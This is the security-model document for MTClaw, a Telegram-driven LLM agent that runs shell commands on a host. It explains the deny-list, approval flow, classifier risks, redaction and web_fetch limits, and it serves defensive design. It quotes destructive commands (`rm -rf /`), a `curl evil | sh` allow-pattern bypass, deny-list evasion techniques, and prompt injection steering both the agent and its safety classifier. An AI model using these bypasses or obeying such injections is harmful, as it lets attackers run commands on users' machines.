# Security model

Read this before you point MTClaw at a real Telegram bot. It exists so you
can make an informed decision about running this at all - it is not softened
for comfort.

## The threat model, stated plainly

This is this project's security model, stated plainly:

> MTClaw turns a Telegram message into shell execution on the host. Anyone who can
> message the bot, and anyone who can inject text the model reads (a web page it
> fetches, a file it opens, a forwarded message), is attempting to run commands as
> your user account.
>
> The deny-list is the only real enforcement boundary. The LLM classifier in `auto`
> mode is a **convenience feature, not a security control** — it can be talked out
> of its judgment by the same injection that produced the command.

Concretely:

1. **Deny-list is checked first and cannot be overridden** - not by the allow-list,
   not by the classifier, not by user approval. A deny match is refused outright and
   the model is told it is refused permanently, so it stops rephrasing.
2. **Injection reaches exec through tool output.** `web_fetch` output is untrusted
   text that lands in the context. The classifier therefore only ever sees the
   command string and its cwd - never page content - so a page cannot address the
   classifier directly. This narrows the channel; it does not close it.
3. **`auto` mode ships off.** Default is `approval`. `onboard` does not offer `auto`.
   Enabling it is a deliberate config edit, and `doctor` prints a warning when it is on.
4. **Confinement is not a sandbox.** `tools.exec.cwd` is a starting directory, not a
   jail; any command can `cd`. Real isolation means containers/VMs and is explicitly
   out of scope. Say so rather than implying safety we do not provide.
5. **Denied ≠ error.** A refusal returns to the model as a tool *result*. The model
   should explain to the user that it was blocked, not retry silently.

**The plainest possible statement of the consequence: the Telegram bot token is
equivalent to shell access on this machine.** Anyone holding the token can message
the bot as if they were it; anyone the bot accepts messages from (your
`allow_from` list) can attempt to run commands as your user account, subject only
to the deny-list below. Telegram bot usernames are publicly discoverable - do not
hand the token, or an `allow_from` entry, to anyone you would not hand a shell to.

## The exec decision pipeline

Every `exec` tool call goes through this pipeline, in this order, with no
shortcuts:

```mermaid
flowchart TD
    CMD[exec tool call] --> DENY{matches tools.exec.deny?}
    DENY -->|yes| REFUSE["REFUSE permanently<br/>audit: denied_rule<br/>never prompts"]
    DENY -->|no| ALLOW{matches tools.exec.allow?}
    ALLOW -->|yes| RUN1["RUN<br/>audit: allowed_rule"]
    ALLOW -->|no| MODE{tools.exec.mode}
    MODE -->|off| NOTREG[tool not registered]
    MODE -->|approval| ASK2[ASK user]
    MODE -->|auto beta| CLS[LLM risk classifier]
    CLS -->|risk none/low<br/>no confirm_on category| RUN2["RUN<br/>audit: auto_allowed"]
    CLS -->|risk high or<br/>confirm_on hit| ASK3[ASK user, include reason]
    CLS -->|error / timeout / unparseable| ASK4[ASK user, fail closed]
    ASK2 & ASK3 & ASK4 --> APPR{Approver verdict}
    APPR -->|approve| RUN3["RUN<br/>audit: approved"]
    APPR -->|deny| REF2["refuse to model<br/>audit: denied_user"]
    APPR -->|timeout / no approver| REF3["refuse to model<br/>audit: expired"]
```

Every ambiguity fails closed to **ASK**, never to RUN: a regex compile error
(caught at startup, before any command reaches this pipeline), a classifier
error/timeout/unparseable response, an approval timeout, or the absence of an
approver at all (cron turns always use `DenyAllApprover`) - all of these ask a
human, or refuse if none exists, never silently execute. The raw command
string reaches deny-list matching unmodified and first, with nothing ahead of
it in the pipeline that could downgrade a deny match to a prompt.

## What the deny-list does and does not stop

The default deny-list (written by `onboard`, OS-appropriate - see
`internal/tools/deny_defaults.go`) catches unconditionally destructive or
irreversible commands: recursive/forced `rm` (short flags of either case, long flags, path-prefixed
forms, and `rm` glued to a separator such as `ls;rm -rf ~`), `find -delete`, `mkfs`, writing to raw disk devices,
fork bombs, `shutdown`/`reboot`/`halt`, `chmod 777 /`, pipe-to-shell
downloads, force-pushes (`-f`, `--force`, `--force-with-lease`, `+refspec`), account/password commands, and shell history
clearing - and the PowerShell equivalents on Windows.

**It stops accidents and naive prompt injection. It does not stop a
determined attacker who already has message access.** Base64-decode-then-pipe,
environment-variable indirection, writing a script to disk and then running
it, or simply rephrasing a blocked command in a way the regex does not
match, are all realistic bypasses. Each deny rule is also checked against a
lightly normalized copy of the command (quotes and a backslash directly
before the command word stripped, e.g. `'rm' -rf /` or `\rm -rf /`), which
closes the cheapest one-character rephrasing - but an interpreter wrapper
like `sh -c 'rm -rf /'`, `bash -c "..."`, or `eval "..."` is not unwrapped and
remains an accepted, documented bypass, same as base64-decode-then-pipe. The
honest boundary is: *do not give the bot token, or an allow_from entry, to
anyone you would not give a shell to.* That sentence belongs here and in the
README, not just here.

**Known accepted false positives**, recorded so a confused user knows the
fix instead of discovering it by trial and error: `docker rm -f <container>`
and `npm rm -f <package>` both match the `rm` deny patterns via the ` rm `
word boundary and are refused, even though neither is the dangerous
`rm -rf` they were written to catch. Over-blocking is the correct failure
direction here - a false-positive refusal costs you one `tools.exec.allow`
entry; an under-block costs data - but it is worth knowing about before it
surprises you mid-conversation.

The force-push rule tolerates only git's own global options between `git`
and `push` (`git -C . push -f` is caught), so `git commit -m 'push +1'` is
not refused; the pattern and its accepted/rejected corpus live in
`internal/tools/deny_defaults.go` and `internal/tools/policy_test.go`. Any
argument to a real `git push` that looks like `-f...` or `+ref` still
matches, including a branch spelled `+something`.

A `tools.exec.allow` pattern is a regex over the whole command, and `.`
matches `;`, `&` and `|`: `^npm run .+$` also allows `npm run build; curl
evil | sh` with no prompt (deny rules still apply). Anchor allow patterns to
a tight character class, for example `^npm run [\w:.-]+$`.

**Process cleanup is not a sandbox.** On unix a timed-out or cancelled
command is killed by signalling its process group, so a descendant that
calls `setsid` (or otherwise leaves the group) survives. On Windows the
command is placed in a Job Object; a grandchild started in the short window
before the shell is assigned to the job is outside it. Both are
best-effort.

An **empty deny-list with `tools.exec.enabled: true` is not a load error**,
but `mtclaw doctor` warns about it loudly, because it removes the only real
enforcement boundary in this design entirely.

## What `web_fetch` refuses

`web_fetch` is the tool most exposed to attacker-chosen URLs, so its limits
are fixed in code (`internal/tools/web_fetch.go`) and not configurable:

- Only `http` and `https`, and only `GET`. A redirect to any other scheme is
  refused, and at most 3 redirects are followed.
- The address is checked at connect time, on every dial, not just on the
  hostname up front. A public URL that redirects to a blocked address, or a
  DNS answer that changes between lookups, is refused on that hop.
- Blocked ranges: loopback, private (RFC 1918 and IPv6 ULA), link-local,
  multicast, unspecified (`0.0.0.0/8`, `::`), CGNAT (`100.64.0.0/10`), and a
  few reserved IPv4 blocks (`192.0.0.0/24`, `198.18.0.0/15`, `240.0.0.0/4`);
  the cloud-metadata address is link-local, so it is covered. IPv4-mapped, NAT64, 6to4, and IPv4-compatible
  IPv6 forms are unwrapped and checked as the IPv4 address they embed.
- Responses with a binary content type (images, archives) are skipped rather
  than read into the model's context.

The fetched text is still untrusted input that reaches the model; see the
threat model above.

## Why `auto` mode is beta

`auto` mode replaces "ask a human for every unmatched command" with "ask a
cheap LLM classifier, and only interrupt for what it flags as risky." This is
a genuine usability improvement for benign, repetitive commands - and a real
weakening of the security posture, because:

- The classifier is itself an LLM call, and LLM calls can be steered by
  adversarial input. The same prompt injection that produced a dangerous
  command in the first place can plausibly talk the classifier into scoring
  it as low-risk.
- The classifier call has a fixed 10 s timeout, after which the command goes
  to a human.
- The classifier only ever sees the command string, its cwd, and the shell -
  never the tool output that may have produced the command - which narrows
  the injection channel but does not close it.
- Any classifier failure (timeout, malformed response, error) already fails
  closed to asking a human; the risk is specifically in what the classifier
  *chooses to approve unattended when it is working correctly*.

Default is `approval`. `onboard` never offers `auto` as a choice - turning it
on is a deliberate, documented config edit, not an onboarding option - and
`mtclaw doctor` always prints a warning when `tools.exec.mode: auto` is set,
regardless of anything else in the config.

## Why cron is allow-list-only

A scheduled job runs with **no interactive approver at all** - there is no
human in the loop watching a terminal or a chat at 3am when a cron job fires.
`internal/tools.DenyAllApprover` is what a cron turn's exec tool gets wired
to, which means anything that would need a human decision (an unmatched
command under `approval` mode, or something the `auto` classifier flags) is
simply refused, with a message telling the model no interactive approver is
available. The only commands a cron job can ever run unattended are ones
that match `tools.exec.allow` outright. This is deliberately conservative:
letting a scheduled job silently prompt-and-timeout (or worse, silently run)
in the middle of the night is a worse failure mode than a cron job that
occasionally has to say "I couldn't run that without approval."

## Redaction is best-effort, not a boundary

An approval prompt **leaves the host**: the command is rendered into a
Telegram message that persists on Telegram's own servers indefinitely. A
command carrying an inline credential (`curl -H "Authorization: Bearer
sk-..."`, `PGPASSWORD=... psql`, `aws --secret-access-key ...`) would publish
that credential to a third party the moment MTClaw asks about it, so
`RedactSecrets` masks common credential shapes (`Bearer` tokens,
`Authorization:` and `X-Api-Key:` headers, URL userinfo passwords
(`https://user:pass@host` becomes `https://user:[REDACTED]@host`),
`--token`/`--password`/`--secret*` flags, `-p<value>`,
any `*_KEY=`/`*_TOKEN=`/`*_SECRET=`/`*_PASSWORD=`/`*_PASSWD=` assignment (so
`API_KEY=`, `GITHUB_TOKEN=`, `AWS_SECRET_ACCESS_KEY=`, and the bare
`PASSWORD=` form are all caught, not just the exact keyword alone), and
common key shapes like `sk-...`, GitHub `ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_`
and `github_pat_...` tokens, `AKIA...`, and long base64/hex
runs (only when the run mixes uppercase, lowercase, and a digit - an
all-lowercase hex string, such as a git SHA, is deliberately left alone so a
commit hash in a command is not masked) before a command ever reaches an
approval prompt or the `exec_audit` table. Every captured value stops at the
first character outside a fixed credential alphabet (letters, digits, and
`. _ ~ + / = : @ % -`), so a shell metacharacter next to a credential-shaped
token - `;`, `|`, `&`, `$`, a backtick, parentheses, angle brackets - is
never swallowed into `[REDACTED]` along with it: what the human is shown
still shows the rest of the command, not a false all-clear. The display
copy an approval prompt actually renders also escapes control characters
(other than newline and tab) and Unicode bidirectional-override characters,
so neither a carriage-return-plus-ANSI sequence nor a reordering trick can
make the prompt show something other than what runs.

**This is pattern matching over plain text, not a security boundary.** It
will miss credentials in shapes it does not recognize, and it does not
change what actually executes - only what is displayed and stored. The real
rule is: **do not let the agent handle credentials as command arguments.**
Put them in an env file the command reads instead, or in the shell
environment MTClaw's own process inherits, never as literal text the model
has to type into a command.

The keyword separators are bounded so a keyword with no value cannot
swallow the next word: `Bearer`, `Authorization:` and `X-Api-Key:` skip only
spaces and tabs, and `--secret*` spans only flag-name characters.

A command longer than about 3500 characters after redaction is refused
(audited as `refused_too_long`, decider `policy`)
before it ever reaches an approval prompt - the model gets a clear error
back instead - rather than shown as a truncated preview a human could
approve without seeing in full. `exec_audit.command` is not bound by that
same limit: it keeps the full redacted command up to 64 KiB, since it is
the durable forensic record and losing the tail there would defeat the
point of keeping it at all.

A spawned command's environment is not the full inherited environment
either: `exec` strips the environment variable names MTClaw's own secrets
would come from - `openai.api_key_env` / `channels.telegram.token_env` when
set, and the same `OPENAI_API_KEY` / `TELEGRAM_BOT_TOKEN` defaults
`config.Load` itself falls back to when either is left empty - before
starting the child, so `env` or `echo $OPENAI_API_KEY` inside that child's
own environment cannot read this process's key or token back out. That is
narrower than it may sound, and the honest limits are worth stating
plainly:

- It only governs the direct child's own environment. Any same-uid
  process - not just that child - can otherwise read this process's
  environment straight out of `/proc/<pid>/environ` on Linux, regardless of
  what the child's own environment contains. Every command that can run the
  exec tool calls `tools.DisableEnvironRead` once at startup (Linux-only; a
  documented no-op elsewhere) to close that vector: `mtclaw gateway` calls it
  directly, and `mtclaw prompt` / `mtclaw cron run` both go through
  `state.newLoop`, which calls it once for both. It sets `PR_SET_DUMPABLE=0` -
  a best-effort call whose own failure only logs a warning, never blocks
  startup. This is process-wide, not something `filterEnv` (or anything
  per-command) does.
- The default shell (`/bin/bash -lc`) is a login shell: it re-sources
  `/etc/profile` and `~/.bash_profile` or `~/.profile` on every invocation,
  which is the ordinary place a user exports `OPENAI_API_KEY` for their own
  shell sessions - if it is exported there, the command's own shell
  start-up puts it right back into that command's environment, and nothing
  described above stops that.
- Nothing else in the environment is filtered at all.

## The atomicity/crash exposure

A turn's messages (the assistant's response, its tool calls, and every tool
result) are buffered in memory and flushed to the store **once**, at the end
of the turn, in a single transaction. This gives an important correctness
property - a crash mid-turn loses the whole turn rather than leaving an
orphaned `tool_calls` row with no matching `tool` result, which would
otherwise poison the session for every future request - but it has a
security-relevant exposure: **a crash after a tool has already acted leaves
no history record that it acted.** If `exec` deletes a directory and the
process dies before the flush, the next turn's context contains no evidence
the command ran, and the model may attempt to run it again.

`exec_audit` (deliberately outside that transaction, and outside the session
delete cascade) is the recovery path: it is the only durable record that a
side effect happened, independent of whether the enclosing turn ever
finished. `mtclaw approvals list` is how you read it. There is no automatic
reconciliation between `exec_audit` and session history in v1 - after a
crash, check the audit log yourself before trusting the model's next answer
about what it has and has not already done.

## What is deliberately not built

No sandbox, no containerization, no seccomp/AppArmor profile, no network
namespace. `tools.exec.cwd` and `tools.filesystem.roots` are confinement by
convention (path checks), not by kernel enforcement. If you need real
isolation, run MTClaw itself inside a container or VM you control - that is
a deployment choice outside this project's scope, not something the config
schema can express.
